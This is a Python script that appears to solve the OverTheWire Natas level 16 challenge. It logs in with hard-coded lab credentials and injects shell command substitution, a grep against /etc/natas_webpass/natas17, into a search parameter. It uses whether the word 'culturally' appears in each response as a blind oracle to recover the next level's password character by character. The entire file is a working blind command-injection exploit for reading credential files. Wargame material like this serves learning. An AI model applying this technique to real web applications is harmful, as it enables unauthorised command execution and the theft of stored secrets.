import requests
from requests.auth import HTTPBasicAuth
import string

authentication = HTTPBasicAuth('natas16','TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V')

password_chars_for_natas17 = ''
allchars = string.ascii_letters + string.digits

for chr in allchars:
    r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=culturally$(grep ' + chr + ' /etc/natas_webpass/natas17)', auth = authentication)

    if 'culturally' not in r.text:
        password_chars_for_natas17 += chr
        print(password_chars_for_natas17)

password = ''

for i in range(32):
    for chr in password_chars_for_natas17:
        r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=culturally$(grep ^'+ password 
        + chr + ' /etc/natas_webpass/natas17)', auth = authentication )

        if 'culturally' not in r.text:
            password += chr
            print(password)
            break

